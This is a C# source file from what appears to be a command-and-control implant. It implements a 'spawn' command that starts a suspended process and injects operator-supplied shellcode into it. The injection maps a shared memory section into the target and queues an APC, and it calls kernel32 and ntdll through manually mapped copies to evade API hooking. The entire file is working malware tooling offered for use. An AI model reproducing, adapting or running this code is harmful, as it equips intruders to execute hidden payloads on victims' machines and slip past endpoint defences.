﻿using Engineer.Commands;
using Engineer.Extra;
using Engineer.Models;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using static Engineer.Extra.h_reprobate.Win32;

namespace Engineer.Commands
{
    internal class Spawn : EngineerCommand
    {
        public override string Name => "spawn";
        private static h_reprobate.PE.PE_MANUAL_MAP ker32 = reprobate.MapModuleToMemory(@"C:\Windows\System32\kernel32.dll");
        public override string Execute(EngineerTask task)
        {
            //get some variuables ready for spawning process
            var si = new WinAPIs.Kernel32.STARTUPINFO();
            si.cb = Marshal.SizeOf(si);
            var pi = new WinAPIs.Kernel32.PROCESS_INFORMATION();
            var pa = new WinAPIs.Kernel32.SECURITY_ATTRIBUTES();
            pa.nLength = Marshal.SizeOf(pa);
            var ta = new WinAPIs.Kernel32.SECURITY_ATTRIBUTES();
            ta.nLength = Marshal.SizeOf(ta);

            if(task.File.Length < 1)
            {
                return "error: " + "No shellcode provided";
            }
            //convert from base64 string to byte array
            byte[] shellcode = task.File;

            // spawn new process 
            Console.WriteLine("attempting to create new process");
            var createProcessParameters = new object[] { $@"{SpawnTo.spawnToPath}", null, ta, pa, false, (uint)0x4, IntPtr.Zero, "C:\\Windows\\System32", si, pi };
            object successCreateProcess = reprobate.CallMappedDLLModuleExport(ker32.PEINFO, ker32.ModuleBase, "CreateProcessW", typeof(WinApiDynamicDelegate.CreateProcessW), createProcessParameters);
            // makes sure we have access to the correct (out) pi values from the API invoke
            pi = (WinAPIs.Kernel32.PROCESS_INFORMATION)createProcessParameters[9];

            if (MapViewLoadShellcode(shellcode, pi.hProcess, pi.hThread))
            {
                return "Shellcode Spawned";
            }
            return "error: " + "Failed to Spawn Shellcode";

        }
        public static bool MapViewLoadShellcode(byte[] shellcode, IntPtr hProcess, IntPtr hThread)
        {
            var ntdll = reprobate.MapModuleToMemory(@"C:\Windows\System32\ntdll.dll");

            var hSection = IntPtr.Zero;
            var maxSize = (ulong)shellcode.Length;

            // dinvoke nt create section
            // make object that holds the input parameters for the api
            var createSectionParameters = new object[] { hSection, (uint)0x10000000, IntPtr.Zero, maxSize, (uint)0x40, (uint)0x08000000, IntPtr.Zero };
            // invoke the api call, pass the dll, function name, delegate type, parameters        
            reprobate.CallMappedDLLModuleExport(ntdll.PEINFO, ntdll.ModuleBase, "NtCreateSection", typeof(WinApiDynamicDelegate.NtCreateSection), createSectionParameters, false);
            hSection = (IntPtr)createSectionParameters[0];

            // dinvoke map view of section local
            IntPtr localBaseAddress = new IntPtr();
            ulong viewSize = new ulong();
            var mapViewParameters = new object[] { hSection, Process.GetCurrentProcess().Handle, localBaseAddress, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, viewSize, (uint)2, (uint)0, (uint)0x04 };
            // invoke the api call, pass the dll, function name, delegate type, parameters        
            reprobate.CallMappedDLLModuleExport(ntdll.PEINFO, ntdll.ModuleBase, "NtMapViewOfSection", typeof(WinApiDynamicDelegate.NtMapViewOfSection), mapViewParameters, false);
            localBaseAddress = (IntPtr)mapViewParameters[2];

            // writeProcessMemory locally so we can map it to target after
            var numberOfBytes = new IntPtr();
            var writeProcessParameters = new object[] { Process.GetCurrentProcess().Handle, localBaseAddress, shellcode, (uint)shellcode.Length, numberOfBytes };
            // invoke the api call, pass the dll, function name, delegate type, parameters        
            reprobate.CallMappedDLLModuleExport(ker32.PEINFO, ker32.ModuleBase, "WriteProcessMemory", typeof(WinApiDynamicDelegate.WriteProcessMemory), writeProcessParameters, false);
            numberOfBytes = (IntPtr)writeProcessParameters[4];
            Console.WriteLine($"[+] Number of bytes written is :{(uint)numberOfBytes}");

            // dinvoke map view of section remote which basically copies shellcode
            IntPtr remoteBaseAddress = new IntPtr();
            mapViewParameters = new object[] { hSection, hProcess, remoteBaseAddress, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, viewSize, (uint)2, (uint)0, (uint)0x20 };
            // invoke the api call, pass the dll, function name, delegate type, parameters        
            reprobate.CallMappedDLLModuleExport(ntdll.PEINFO, ntdll.ModuleBase, "NtMapViewOfSection", typeof(WinApiDynamicDelegate.NtMapViewOfSection), mapViewParameters, false);
            remoteBaseAddress = (IntPtr)mapViewParameters[2];
            Console.WriteLine($"Mapped view to target");

            // Queue user APC
            var queueUserParameters = new object[] { remoteBaseAddress, hThread, (uint)0 };
            // invoke the api call, pass the dll, function name, delegate type, parameters        
            reprobate.CallMappedDLLModuleExport(ker32.PEINFO, ker32.ModuleBase, "QueueUserAPC", typeof(WinApiDynamicDelegate.QueueUserAPC), queueUserParameters, false);

            // resume thread to activate 
                        var resumeThreadnParameters = new object[] { hThread };
            // invoke the api call, pass the dll, function name, delegate type, parameters        
            object createThreadResult = reprobate.CallMappedDLLModuleExport(ker32.PEINFO, ker32.ModuleBase, "ResumeThread", typeof(WinApiDynamicDelegate.ResumeThread), resumeThreadnParameters, false);

            reprobate.FreeModule(ntdll);
            reprobate.FreeModule(ker32);

            if ((uint)createThreadResult == 1)
                return true;
            else
                return false;
        }
    }
}
